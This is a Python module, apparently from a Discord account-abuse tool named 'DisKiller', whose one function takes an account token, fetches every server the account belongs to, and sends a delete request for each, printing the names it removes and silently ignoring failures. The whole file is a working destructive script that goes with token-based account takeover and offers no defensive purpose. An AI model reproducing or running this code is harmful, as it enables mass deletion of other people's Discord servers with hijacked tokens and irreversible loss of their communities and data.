import requests
from data.common import *

def deleteServers(token):
    set_console_title("DisKiller  | Delete Servers")
    guildsIds = requests.get("https://discord.com/api/v8/users/@me/guilds", headers=getheaders(token)).json()
    for guild in guildsIds:
        try:
            requests.delete(f'https://discord.com/api/v8/guilds/'+guild['id'], headers={'Authorization': token})
            print(f'{rr}[ {w}+ {rr}]{w} Deleted:{rr} '+guild['name']+Fore.RESET)
        except Exception as e:
            print(f"The following error has been encountered and is being ignored: {e}")